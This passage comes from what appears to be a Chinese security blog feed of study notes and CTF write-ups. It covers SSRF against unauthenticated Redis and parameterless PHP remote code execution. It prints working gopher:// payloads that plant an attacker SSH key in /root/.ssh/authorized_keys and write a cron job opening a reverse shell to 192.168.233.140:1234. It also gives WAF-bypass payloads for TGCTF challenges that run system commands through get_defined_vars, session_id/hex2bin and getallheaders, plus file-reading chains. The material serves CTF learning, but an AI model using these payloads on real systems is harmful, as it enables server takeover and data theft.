class="hljs-number">0</span>f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+<span class="hljs-number">16</span>UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali%0d%0a%0d%0a%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0asave%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0aquit<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSET%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">11</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/root/.ssh/%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">15</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aauthorized_keys%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">7</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>apayload%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">568</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+<span class="hljs-number">2</span>l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+<span class="hljs-number">0</span>f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+<span class="hljs-number">16</span>UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit<br></code></pre></td></tr></table></figure><p>在没有写入SSH公钥前使用私钥测试连接</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2222</span> root<span class="hljs-keyword">@192</span>.168.233.137<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424164425169.png" alt="image-20250424164425169"></p><p>会发现需要公钥，连接不上</p><p>在提交payload后，再次连接，发现不需要公钥了，直接可以连接</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424164844401.png" alt="image-20250424164844401"></p><h3 id="使用SSRF对Redis未授权计划任务Shell反弹"><a href="#使用SSRF对Redis未授权计划任务Shell反弹" class="headerlink" title="使用SSRF对Redis未授权计划任务Shell反弹"></a>使用SSRF对Redis未授权计划任务Shell反弹</h3><ul><li>权限问题，Ubuntu定时任务需要root权限</li><li>Redis备份文件存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ul><p>使用SSRF利用此漏洞切记在写入计划任务前后要加上<code>\n</code>来进行换行，否则数据污染会导致计划任务无法执行</p><p>要写入的目录是<code>/var/spool/cron/</code></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424171403427.png" alt="image-20250424171403427"></p><p>使用工具，选择第一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 gopherus.py --exploit redis<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424165757734.png" alt="image-20250424165757734"></p><p>填写目标的IP地址（根据实际填写）</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170000438.png" alt="image-20250424170000438"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2470</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A/<span class="hljs-number">1</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>bash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>sh%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>/dev/tcp/<span class="hljs-number">192.168.233.140</span>/<span class="hljs-number">1234</span>%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2416</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/var/spool/cron/%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aroot%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p>会反弹到1234端口，要进行监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 1234<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170153391.png" alt="image-20250424170153391"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170514771.png" alt="image-20250424170514771"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170556802.png" alt="image-20250424170556802"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞笔记</category>
      
      <category>SSRF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF 学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无参RCE解题</title>
    <link href="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/"/>
    <url>/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="正常解题"><a href="#正常解题" class="headerlink" title="正常解题"></a>正常解题</h1><h3 id="TGCTF–偷渡阴平"><a href="#TGCTF–偷渡阴平" class="headerlink" title="TGCTF–偷渡阴平"></a>TGCTF–偷渡阴平</h3><p><strong>考点总结：</strong> PHP session_id、绕过waf、无参RCE（非预期）</p><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>非预期打无参RCE</p><p><strong>方法一：</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?tgctf2025=eval(<span class="hljs-keyword">end</span>(<span class="hljs-keyword">current</span>(get_defined_vars())));&amp;b=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><ul><li><code>get_defined_vars()</code>获取已经定义的所有变量并返回一个数组</li><li><code>current()</code>接收前面的函数返回的数组并返回数组第一个元素</li><li><code>end()</code>将会移动数组内部指针到最后一个数组元素并返回这个值</li><li><code>eval</code>将会执行返回的值，然后引用赋值（就是&amp;符号），将后边命令的结果赋值给b，这个b就是数组的最后一个元素，最终会被eval执行并且输出结果</li></ul><p><strong>方法二</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?tgctf2025=var_dump(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(getcwd())))));<br></code></pre></td></tr></table></figure><ul><li><code>getcwd()</code>：返回当前工作目录的绝对路径</li><li><code>dirname()</code>：这个函数会返回指定路径的父目录，这里可以利用这个函数进行目录穿越到根目录</li><li><code>scandir()</code>：这个函数会将指定目录下的所有文件和子目录的名称作为一个数组返回，这里返回的是根目录的所有文件和子目录</li><li><code>var_dump()</code>：将返回的含有根目录的文件和子目录名的数组打印出来</li></ul><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415002022637.png" alt="image-20250415002022637"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?tgctf2025=highlight_file(array_rand(array_flip(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">chdir</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(getcwd())))))))));<br></code></pre></td></tr></table></figure><ul><li><code>dirname(dirname(dirname(getcwd())))</code>：穿越到根目录，并返回根目录</li><li><code>chdir()</code>：这个函数会改变当前的工作目录到指定目录，这里将工作目录改变为根目录，并返回布尔值，如果没有这一步会发现不能读取根目录下的文件，只会报错</li><li><code>dirname()</code>：因为上面的函数的返回值是布尔类型，但后面的函数接收的类型要是指定的目录，所以这里要加一个这个函数，将返回值改成根目录</li><li><code>scandir()</code>：这个函数会将指定目录下的所有文件和子目录的名称作为一个数组返回，这里返回的是根目录的所有文件和子目录</li><li><code>array_flip()</code> ：这个函数用于交换数组中键和值的位置，若 <code>scandir()</code> 返回的数组是 <code>[&#39;.&#39;, &#39;..&#39;, &#39;file1.txt&#39;, &#39;file2.php&#39;]</code>，经过 <code>array_flip()</code> 处理后，会变成 <code>[&#39;.&#39; =&gt; 0, &#39;..&#39; =&gt; 1, &#39;file1.txt&#39; =&gt; 2, &#39;file2.php&#39; =&gt; 3]</code></li><li><code>array_rand()</code> ：这个函数用于从数组中随机选取一个或多个键，这里就会随机选一个文件</li><li><code>highlight_file()</code> ：这个函数将随机选取的文件内容高亮显示出来</li></ul><p>缺少<code>scandir()</code>函数更改工作目录这一步的结果是无法读取文件</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415005040694.png" alt="image-20250415005040694"></p><p>加上这个函数就可以读文件了，因为是随机选取一个文件，所以刷新几次就可以读到了</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415004819352.png" alt="image-20250415004819352"></p><p><strong>方法三</strong>：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?tgctf2025=show_source(<span class="hljs-built_in">array</span>_rand(<span class="hljs-built_in">array</span>_flip(scandir(dirname(chdir(strrev(crypt(serialize(<span class="hljs-built_in">array</span>())))))))));<br></code></pre></td></tr></table></figure><ul><li><code>array()</code>：创建一个空数组</li><li><code>serialize()</code>：将创建的空数组序列化成字符串，结果是<code>a:0:&#123;&#125;</code></li><li><code>crypt()</code>：对序列化后的字符串进行加密，最后得到的结果是随机的，如<code>$1$pc4jiIfD$pqtTfFXRHonNcpqbxqhtK.</code>，这里就是需要随机出最后一个字符是点<code>.</code></li><li><code>strrev()</code>：把加密后的字符串进行反转，将点<code>.</code>放到字符串的开头</li><li><code>ord()</code> 函数返回字符串第一个字符的 ASCII 值</li><li><code>chr()</code> 函数根据 ASCII 值返回对应的字符</li><li><code>chdir()</code>：这个函数会改变当前的工作目录到指定目录，这里将工作目录改变为根目录，并返回布尔值，如果没有这一步会发现不能读取根目录下的文件，只会报错</li><li><code>dirname()</code>：因为上面的函数的返回值是布尔类型，但后面的函数接收的类型要是指定的目录，所以这里要加一个这个函数，将返回值改成根目录</li><li><code>scandir()</code>：这个函数会将指定目录下的所有文件和子目录的名称作为一个数组返回，这里返回的是根目录的所有文件和子目录</li><li><code>array_flip()</code> ：这个函数用于交换数组中键和值的位置</li><li><code>array_rand()</code> ：这个函数用于从数组中随机选取一个或多个键，这里就会随机选一个文件</li><li><code>show_source()</code>：这个函数将随机选取的文件内容高亮显示出来</li></ul><h1 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h1><h2 id="hex2bin（）"><a href="#hex2bin（）" class="headerlink" title="hex2bin（）"></a>hex2bin（）</h2><h3 id="TGCTF–偷渡阴平（复仇）"><a href="#TGCTF–偷渡阴平（复仇）" class="headerlink" title="TGCTF–偷渡阴平（复仇）"></a>TGCTF–偷渡阴平（复仇）</h3><p>**考点总结：**PHP、session_id、绕过waf、RCE</p><p>这个把无参RCE给ban了，避免非预期</p><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?tgctf2025=<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>()));<br><span class="hljs-comment">// cookie中构造cat /flag的十六进制字符串</span><br>PHPSESSID=<span class="hljs-number">636174202</span>f666c6167<br></code></pre></td></tr></table></figure><ul><li><p><code>session_start()</code> ：在 PHP中 这个函数的作用是开启一个新会话或者复用已有的会话</p></li><li><p><code>session_id()</code> ：这个函数用于获取当前会话的 ID，即<code>cookie</code>中的<code>PHPSESSID</code></p></li><li><p><code>hex2bin()</code>：这个函数会将<code>PHPSESSID</code>的 十六进制字符串转化为二进制字符串</p></li><li><p><code>system()</code>：会执行转化后的二进制字符串命令</p></li></ul><p>这题的解题思路就是开启一个新会话，通过在当前会话的 ID 中构造要执行的命令，并转化为二进制字符串，使用<code>system()</code>函数执行命令</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415124542664.png" alt="image-20250415124542664"></p><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>如果知道文件名，可以直接使用readfile读文件，在 PHPSESSION 中写入文件名</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">session_id</span>(<span class="hljs-title">session_start</span>()));</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250416162541034.png" alt="image-20250416162541034"></p><h1 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h1><p>这个函数可以返回当前请求的所有请求头信息，局限于Apache</p><p><code>apache_request_headers()</code>和<code>getallheaders()</code>功能相似，可互相替代，不过也是局限于Apache</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()));</span><br></code></pre></td></tr></table></figure><p>这里可以在数据包最后加入一个请求头，写入恶意代码，使用<code>end()</code>函数指向最后一个请求头，从而可以执行命令</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250416163003976.png" alt="image-20250416163003976"></p><h1 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h1><p>相较于<code>getallheaders()</code>更加具有普遍性，这个函数可以回显所有变量</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-variable">b</span>=<span class="hljs-title">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);</span><br></code></pre></td></tr></table></figure><ul><li><code>get_defined_vars()</code>获取已经定义的所有变量并返回一个数组</li><li><code>current()</code>接收前面的函数返回的数组并返回数组第一个元素</li><li><code>end()</code>将会移动数组内部指针到最后一个数组元素并返回这个值</li><li><code>eval</code>将会执行返回的值，然后引用赋值（就是&amp;符号），将后边命令的结果赋值给b，这个b就是数组的最后一个元素，最终会被eval执行并且输出结果</li></ul><h1 id="chdir-array-rand-赌狗读文件"><a href="#chdir-array-rand-赌狗读文件" class="headerlink" title="chdir()&amp;array_rand()赌狗读文件"></a>chdir()&amp;array_rand()赌狗读文件</h1><p>如果无法进行RCE，可以进行目录遍历读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 获取当前目录</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br><br><span class="hljs-comment"># 列出当前工作目录的父目录中的所有文件和目录</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br><br><span class="hljs-comment"># 读上一级文件名</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<br><br><span class="hljs-comment"># 读根目录</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>() )))))))))));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞笔记</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>无参RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无参RCE函数</title>
    <link href="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/"/>
    <url>/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/</url>
    
